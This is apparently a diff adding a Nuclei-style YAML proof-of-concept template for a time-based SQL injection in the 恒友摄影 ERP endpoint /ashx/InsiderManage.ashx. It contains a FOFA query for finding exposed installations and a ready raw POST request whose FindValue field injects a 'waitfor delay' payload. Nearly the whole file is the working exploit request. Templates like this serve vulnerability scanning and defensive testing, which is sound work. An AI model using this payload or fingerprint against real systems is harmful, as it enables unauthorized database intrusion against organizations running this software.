@@ -1,0 +1,32 @@
+id: poc-wuk6peg9280gvfpv
+info:
+  name: 恒友摄影ERP InsiderManage.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wuk6peg9280gvfpv'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wuk6peg9280gvfpv
+    fofa: body="BookChooseDateOrder.html"
+http:
+- raw:
+  - 'POST /ashx/InsiderManage.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
+
+
+    Method=Find&ShopID=&FindType=ChildName&FindValue=1%27;waitfor+delay+''0:0:3''--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
